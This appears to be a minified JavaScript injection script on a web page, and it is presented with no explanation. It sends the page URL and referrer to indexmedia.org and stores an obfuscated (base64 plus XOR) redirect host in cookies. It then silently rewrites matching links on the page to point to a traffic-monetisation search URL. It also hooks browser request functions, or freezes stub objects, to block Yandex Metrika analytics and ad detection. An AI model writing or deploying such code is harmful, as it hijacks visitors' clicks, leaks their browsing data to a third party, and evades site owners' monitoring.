(function () {if (!Array.prototype.indexOf) {Array.prototype.indexOf = function (elem, from) {var from = from || 0;if (from > this.length) return -1;for (var i = 0; i < this.length; i++) {if (this[i] == elem && from <= i) return i;else if (this[i] == elem && from > i) return -1;}return -1;};};function core_cookie_get(name) {var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));return matches ? decodeURIComponent(matches[1]) : undefined;};function core_cookie_set(name, value, expire) {var exdate = new Date(), expire = expire * 3600000;exdate.setTime(exdate.getTime() + expire);var set = name + "=" + unescape(value) + "; expires=" + exdate.toUTCString() + "; path=/";document.cookie = set;};function core_http(method, url) {var xhr = new XMLHttpRequest();if ("withCredentials" in xhr) {xhr.open(method, url, true);} else if (typeof XDomainRequest != "undefined") {xhr = new XDomainRequest();xhr.open(method, url);} else {xhr = null;}return xhr;};function core_escape(str) {var ret = [], trans = [];for (var i = 0x410; i <= 0x44F; i++) trans[i] = i - 0x350;trans[0x401] = 0xA8;trans[0x451] = 0xB8;for (var i = 0; i < str.length; i++) {var n = str.charCodeAt(i);if (typeof trans[n] != "undefined") n = trans[n];if (n <= 0xFF) ret.push(n);}return escape(String.fromCharCode.apply(null, ret));};function core_stripslashes(str) {return str.replace('/\0/g', '0').replace('/\(.)/g', '$1');};function core_base64(str) {var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, ac = 0, dec = '', tmp_arr = [];if (!str) return str;str += '';do {h1 = b64.indexOf(str.charAt(i++));h2 = b64.indexOf(str.charAt(i++));h3 = b64.indexOf(str.charAt(i++));h4 = b64.indexOf(str.charAt(i++));bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;o1 = bits >> 16 & 0xff;o2 = bits >> 8 & 0xff;o3 = bits & 0xff;if (h3 == 64) {tmp_arr[ac++] = String.fromCharCode(o1);} else if (h4 == 64) {tmp_arr[ac++] = String.fromCharCode(o1, o2);} else {tmp_arr[ac++] = String.fromCharCode(o1, o2, o3);}} while (i < str.length);dec = tmp_arr.join('');return dec.replace(/\0+$/, '');};function core_xor(str) {var xored = '';for (i=0; i<str.length; i++) {var a = str.charCodeAt(i);var b = a ^ 141;xored = xored+String.fromCharCode(b);}return xored;};co427797fn = window.co427797fn || {};co427797fn.se = ['', 'video', 'soft', 'game', 'audio', 'file'];var option = window['co427797'],pid = option.id || 1,ver = option.ver || 3,cache_host = 'host' + pid + ver,cache_utm = 'utm' + pid + ver,host = core_cookie_get(cache_host),utm = core_cookie_get(cache_utm);var _local = 'https:',_remote = document.location.protocol == 'https:' ? 'https:' : 'http:',_host = '//indexmedia.org',_core = '//indexmedia.org',_core_data = 'https:' + _core + '/v3/target.json?pid=' + pid + '&ver=' + ver + '&utm_source=' + document.referrer.split('/')[2] + '&utm_campaign=' + core_escape(document.URL);co427797fn['params'] = function(option) {option.q = option.q || unescape(document.getElementsByTagName("TITLE")[0].innerHTML.substring(0, 150));option.q_def = option.q_def || ['Запрос по умолчанию'],option.is_stop = option.is_stop || ['скачать','бесплатно','смотреть','онлайн'];option.se = option.se || 0;option.page = option.page || 'search';option.host = core_xor(core_base64(host)) || '';option.utm = utm || '';option.is_demo = option.is_demo || 0;option.is_explode = option.is_explode || '';option.is_target = option.is_target || 0;option.is_blank = option.is_blank || 0;option.is_modified = option.is_modified || 0;option.pattern = option.pattern || [];option.timeout = option.timeout || 1000;return option;};co427797fn.DateDiff = function(last, now) {var ld = last.getTime(), nd = now.getTime();return parseInt((nd - ld) / (24 * 3600 * 1000));};co427797fn['ChangerInit'] = function(option) {option = co427797fn['params'](option);var query = option.q, _query = '';query = decodeURIComponent(query).replace(/\++/g, " ");for (i = 0; i < option.is_stop.length; i++) query = query.replace(new RegExp(option.is_stop[i], "gi"), "");if (!query) query = option.q_def[Math.floor(Math.random() * option.q_def.length)];if (option.is_explode) {_query = query.split(option.is_explode[0]);query = _query[option.is_explode[1]-1] ? _query[option.is_explode[1]-1] : query;}if (option.host == '#empty') return false;if (co427797fn.is_skip) return false;option.target = core_stripslashes(option.host + option.page + '?q=' + core_escape(query) + '&se=' + co427797fn.se[option.se] + '&pid=' + pid) + (option.is_target ? '&target=' + option.is_target : '') + '&utm_term=' + option.utm + '&is_direct=1';if (option.is_modified != 0) {var r = core_http('HEAD', window.location.href);if (r) {r.onload = function() {var _mtime = new Date(r.getResponseHeader('Last-Modified')), _diff = co427797fn.DateDiff(_mtime, new Date());if (_diff >= option.is_modified) setTimeout(function() { new co427797fn['Changer'](option) }, option.timeout);};r.send();}} else {setTimeout(function() { new co427797fn['Changer'](option) }, option.timeout);}};co427797fn['Changer'] = function(option) {var data = document.getElementsByTagName('a');for (i=0; i < data.length; i++) {var object = data[i].href;for (a = 0; a < option.pattern.length; a++) {if (object.match(new RegExp(option.pattern[a], "gi"))) {data[i].href = option.target;data[i].target =  option.is_blank == 1 ? '_blank' : '_blank';}}}};if (typeof host == "undefined") {var r = core_http('POST', _core_data);if (r) {r.onload = function() {var json = JSON.parse(r.responseText);host = json.host;utm = json.utm;core_cookie_set(cache_host, host, 2);core_cookie_set(cache_utm, utm, 2);new co427797fn['ChangerInit'](option);};r.send();}} else {new co427797fn['ChangerInit'](option);};if (window.Ya) {var oc = document.createElement.bind(document);document.createElement = function(args) {if (arguments && arguments.callee && arguments.callee.caller && arguments.callee.caller.name && arguments.callee.caller.name === "request") {return;} else {return oc(args);}};var ob = window.navigator.sendBeacon.bind(window);window.navigator.sendBeacon = function(args) {if (arguments && arguments.callee && arguments.callee.caller && arguments.callee.caller.name && arguments.callee.caller.name === "request") {return true;} else {return ob(args);}};var ox = XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send = function(args){if (arguments && arguments.callee && arguments.callee.caller && arguments.callee.caller.name && arguments.callee.caller.name === "request") {return;} else {return ox.apply(this, arguments);}};} else {window.Ya = {Metrika: {},Metrika2: {},_metrika: {},AdDetector: {}};Object.freeze(window.Ya);Object.freeze(window.Ya.Metrika);Object.freeze(window.Ya.Metrika2);Object.freeze(window.Ya._metrika);Object.freeze(window.Ya.AdDetector);}})();